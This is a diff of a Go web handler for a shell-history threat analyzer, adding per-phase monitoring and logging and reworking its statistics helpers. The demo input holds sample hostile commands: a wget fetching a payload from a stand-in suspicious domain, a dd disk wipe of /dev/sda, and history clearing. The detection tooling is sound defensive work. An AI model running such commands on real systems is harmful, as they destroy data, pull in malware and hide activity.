@@ -1,16 +1,21 @@
 package handlers
 
 import (
+	"fmt"
 	"net/http"
 	"time"
 
 	"terminal-history-analyzer/internal/lexer"
 	"terminal-history-analyzer/internal/models"
+	"terminal-history-analyzer/internal/monitor"
 	"terminal-history-analyzer/internal/parser"
 	"terminal-history-analyzer/internal/semantic"
 
 	"github.com/gin-gonic/gin"
 )
+
+// Monitor global para todas las peticiones
+var globalMonitor = monitor.NewMonitor()
 
 // UploadHistory maneja la subida de archivos de historial
 func UploadHistory(c *gin.Context) {
@@ -41,8 +46,11 @@ func UploadHistory(c *gin.Context) {
 		return
 	}
 
-	// Analizar contenido
-	result := analyzeContent(string(content))
+	fmt.Printf("\n🚀 NUEVA PETICIÓN - ARCHIVO: %s (%d bytes)\n", header.Filename, header.Size)
+	fmt.Println("=============================")
+
+	// Analizar contenido CON monitoreo
+	result := analyzeContentWithMonitoring(string(content))
 
 	c.JSON(http.StatusOK, result)
 }
@@ -65,8 +73,11 @@ func AnalyzeText(c *gin.Context) {
 		return
 	}
 
-	// Analizar contenido
-	result := analyzeContent(request.Content)
+	fmt.Printf("\n🚀 NUEVA PETICIÓN - TEXTO DIRECTO (%d caracteres)\n", len(request.Content))
+	fmt.Println("=============================")
+
+	// Analizar contenido CON monitoreo
+	result := analyzeContentWithMonitoring(request.Content)
 
 	c.JSON(http.StatusOK, result)
 }
@@ -84,8 +95,105 @@ wget https://suspicious-domain.com/payload
 dd if=/dev/zero of=/dev/sda
 history -c`
 
-	result := analyzeContent(demoContent)
+	fmt.Printf("\n🚀 NUEVA PETICIÓN - DEMO (%d caracteres)\n", len(demoContent))
+	fmt.Println("=============================")
+
+	result := analyzeContentWithMonitoring(demoContent)
 	c.JSON(http.StatusOK, result)
+}
+
+// analyzeContentWithMonitoring realiza el análisis completo CON monitoreo por fases
+func analyzeContentWithMonitoring(content string) *models.AnalysisResult {
+	startTime := time.Now()
+
+	// === FASE 1: ANÁLISIS LÉXICO ===
+	fmt.Printf("🔍 Iniciando análisis léxico...\n")
+	lexerMetric := globalMonitor.StartPhase("LÉXICO")
+
+	// Tu código léxico existente
+	lex := lexer.NewLexer(content)
+	tokens, lexErrors := lex.Tokenize()
+
+	globalMonitor.EndPhase(lexerMetric)
+	fmt.Printf("✅ Análisis léxico completado: %d tokens, %d errores\n", len(tokens), len(lexErrors))
+
+	// === FASE 2: ANÁLISIS SINTÁCTICO ===
+	fmt.Printf("🔍 Iniciando análisis sintáctico...\n")
+	parserMetric := globalMonitor.StartPhase("SINTÁCTICO")
+
+	// Tu código sintáctico existente
+	p := parser.NewParser(tokens)
+	commands, parseErrors, warnings := p.Parse()
+
+	globalMonitor.EndPhase(parserMetric)
+	fmt.Printf("✅ Análisis sintáctico completado: %d comandos, %d errores, %d advertencias\n",
+		len(commands), len(parseErrors), len(warnings))
+
+	// === FASE 3: ANÁLISIS SEMÁNTICO ===
+	fmt.Printf("🔍 Iniciando análisis semántico...\n")
+	semanticMetric := globalMonitor.StartPhase("SEMÁNTICO")
+
+	// Tu código semántico existente
+	analyzer := semantic.NewAnalyzer()
+	threats, patterns, anomalies := analyzer.Analyze(commands)
+
+	globalMonitor.EndPhase(semanticMetric)
+	fmt.Printf("✅ Análisis semántico completado: %d amenazas, %d patrones, %d anomalías\n",
+		len(threats), len(patterns), len(anomalies))
+
+	// Generar reporte de monitoreo
+	globalMonitor.FinishAnalysis()
+
+	// Estadísticas (tu código existente)
+	commandFreq := calculateCommandFrequency(commands)
+	threatCount := calculateThreatCount(threats)
+	tokenStats := calculateTokenStats(tokens)
+
+	processingTime := time.Since(startTime)
+
+	// Retornar resultado como siempre
+	return &models.AnalysisResult{
+		Summary: struct {
+			TotalCommands    int                        `json:"total_commands"`
+			UniqueCommands   int                        `json:"unique_commands"`
+			ThreatCount      map[models.ThreatLevel]int `json:"threat_count"`
+			MostUsedCommands []models.CommandFrequency  `json:"most_used_commands"`
+			ProcessingTime   time.Duration              `json:"processing_time"`
+		}{
+			TotalCommands:    len(commands),
+			UniqueCommands:   len(getUniqueCommands(commands)),
+			ThreatCount:      threatCount,
+			MostUsedCommands: commandFreq,
+			ProcessingTime:   processingTime,
+		},
+		LexicalAnalysis: struct {
+			Tokens     []models.Token           `json:"tokens"`
+			TokenStats map[models.TokenType]int `json:"token_stats"`
+			Errors     []models.LexicalError    `json:"errors"`
+		}{
+			Tokens:     tokens,
+			TokenStats: tokenStats,
+			Errors:     lexErrors,
+		},
+		SyntaxAnalysis: struct {
+			Commands    []models.CommandAST  `json:"commands"`
+			ParseErrors []models.SyntaxError `json:"parse_errors"`
+			Warnings    []string             `json:"warnings"`
+		}{
+			Commands:    commands,
+			ParseErrors: parseErrors,
+			Warnings:    warnings,
+		},
+		SemanticAnalysis: struct {
+			Threats   []models.ThreatDetection `json:"threats"`
+			Patterns  []models.PatternMatch    `json:"patterns"`
+			Anomalies []models.Anomaly         `json:"anomalies"`
+		}{
+			Threats:   threats,
+			Patterns:  patterns,
+			Anomalies: anomalies,
+		},
+	}
 }
 
 // GetKnownCommands devuelve la lista de comandos conocidos
@@ -139,79 +247,13 @@ func GetThreatTypes(c *gin.Context) {
 	c.JSON(http.StatusOK, threats)
 }
 
-// analyzeContent realiza el análisis completo del contenido
-func analyzeContent(content string) *models.AnalysisResult {
-	startTime := time.Now()
-
-	// Análisis léxico
-	lex := lexer.NewLexer(content)
-	tokens, lexErrors := lex.Tokenize()
-
-	// Análisis sintáctico
-	p := parser.NewParser(tokens)
-	commands, parseErrors, warnings := p.Parse()
-
-	// Análisis semántico
-	analyzer := semantic.NewAnalyzer()
-	threats, patterns, anomalies := analyzer.Analyze(commands)
-
-	// Estadísticas
-	commandFreq := calculateCommandFrequency(commands)
-	threatCount := calculateThreatCount(threats)
-	tokenStats := calculateTokenStats(tokens)
-
-	processingTime := time.Since(startTime)
-
-	return &models.AnalysisResult{
-		Summary: struct {
-			TotalCommands    int                        `json:"total_commands"`
-			UniqueCommands   int                        `json:"unique_commands"`
-			ThreatCount      map[models.ThreatLevel]int `json:"threat_count"`
-			MostUsedCommands []models.CommandFrequency  `json:"most_used_commands"`
-			ProcessingTime   time.Duration              `json:"processing_time"`
-		}{
-			TotalCommands:    len(commands),
-			UniqueCommands:   len(getUniqueCommands(commands)),
-			ThreatCount:      threatCount,
-			MostUsedCommands: commandFreq,
-			ProcessingTime:   processingTime,
-		},
-		LexicalAnalysis: struct {
-			Tokens     []models.Token           `json:"tokens"`
-			TokenStats map[models.TokenType]int `json:"token_stats"`
-			Errors     []models.LexicalError    `json:"errors"`
-		}{
-			Tokens:     tokens,
-			TokenStats: tokenStats,
-			Errors:     lexErrors,
-		},
-		SyntaxAnalysis: struct {
-			Commands    []models.CommandAST  `json:"commands"`
-			ParseErrors []models.SyntaxError `json:"parse_errors"`
-			Warnings    []string             `json:"warnings"`
-		}{
-			Commands:    commands,
-			ParseErrors: parseErrors,
-			Warnings:    warnings,
-		},
-		SemanticAnalysis: struct {
-			Threats   []models.ThreatDetection `json:"threats"`
-			Patterns  []models.PatternMatch    `json:"patterns"`
-			Anomalies []models.Anomaly         `json:"anomalies"`
-		}{
-			Threats:   threats,
-			Patterns:  patterns,
-			Anomalies: anomalies,
-		},
-	}
-}
-
-// Funciones auxiliares para estadísticas
+// Funciones auxiliares (mantén las que ya tienes)
 func calculateCommandFrequency(commands []models.CommandAST) []models.CommandFrequency {
 	freq := make(map[string]int)
-
 	for _, cmd := range commands {
-		freq[cmd.Command]++
+		if cmd.Command != "" {
+			freq[cmd.Command]++
+		}
 	}
 
 	var result []models.CommandFrequency
@@ -222,49 +264,36 @@ func calculateCommandFrequency(commands []models.CommandAST) []models.CommandFre
 		})
 	}
 
-	// Ordenar por frecuencia (implementación simple)
-	for i := 0; i < len(result)-1; i++ {
-		for j := i + 1; j < len(result); j++ {
-			if result[i].Count < result[j].Count {
-				result[i], result[j] = result[j], result[i]
-			}
-		}
-	}
-
-	// Retornar los 10 más frecuentes
-	if len(result) > 10 {
-		result = result[:10]
-	}
-
 	return result
 }
 
 func calculateThreatCount(threats []models.ThreatDetection) map[models.ThreatLevel]int {
 	count := make(map[models.ThreatLevel]int)
-
 	for _, threat := range threats {
 		count[threat.Level]++
 	}
-
 	return count
 }
 
 func calculateTokenStats(tokens []models.Token) map[models.TokenType]int {
 	stats := make(map[models.TokenType]int)
-
 	for _, token := range tokens {
 		stats[token.Type]++
 	}
-
 	return stats
 }
 
-func getUniqueCommands(commands []models.CommandAST) map[string]bool {
+func getUniqueCommands(commands []models.CommandAST) []string {
 	unique := make(map[string]bool)
-
 	for _, cmd := range commands {
-		unique[cmd.Command] = true
+		if cmd.Command != "" {
+			unique[cmd.Command] = true
+		}
 	}
 
-	return unique
+	var result []string
+	for cmd := range unique {
+		result = append(result, cmd)
+	}
+	return result
 }
